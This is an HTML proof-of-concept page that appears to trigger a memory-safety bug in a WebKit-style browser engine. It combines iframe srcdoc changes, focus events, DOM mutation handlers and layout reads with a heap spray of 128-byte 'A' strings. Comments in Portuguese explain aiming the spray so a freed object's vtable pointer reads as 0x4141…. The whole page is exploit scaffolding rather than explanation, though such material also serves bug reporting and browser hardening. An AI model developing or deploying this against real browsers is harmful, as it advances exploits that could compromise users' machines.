<!DOCTYPE html>
<html>
<body>
<iframe id="frame_a" loading="lazy"></iframe>
<iframe id="frame_b" srcdoc="b"></iframe>
<div id="container" tabindex="0" autofocus></div>
<div id="log"></div>
<script>
const logEl = document.getElementById("log");
let visit = localStorage.getItem("visit") || "0";
localStorage.setItem("visit", String(parseInt(visit) + 1));

// Spray: StringImpl(128 chars Latin-1) = 16 header + 128 = 144 bytes → bin 160
// Conteúdo: 0x4141414141414141 nos primeiros 8 bytes → se scrollHeight ler
// isso como vtable ptr, o crash vai para 0x4141...  em vez de vtable do ScheduledLocationChange
const SPRAY_CONTENT = "A".repeat(128);

logEl.addEventListener("DOMSubtreeModified", function handler() {
    logEl.removeEventListener("DOMSubtreeModified", handler);
    window._spray = [];
    for (let i = 0; i < 500; i++) {
        window._spray.push(SPRAY_CONTENT);
    }
});

const op = () => {
    logEl.textContent += visit + "\n";
    logEl.scrollTop = logEl.scrollHeight;
};

let frame = document.getElementById("frame_a");
op(); op();

addEventListener("load", () => {
    op();
    frame.srcdoc = "a";
    op();
    frame.contentWindow?.addEventListener("blur", () => {});
    frame.focus();
    op();
});

container.onfocusin = () => {
    document.body.innerHTML = "";
};
</script>
</body>
</html>
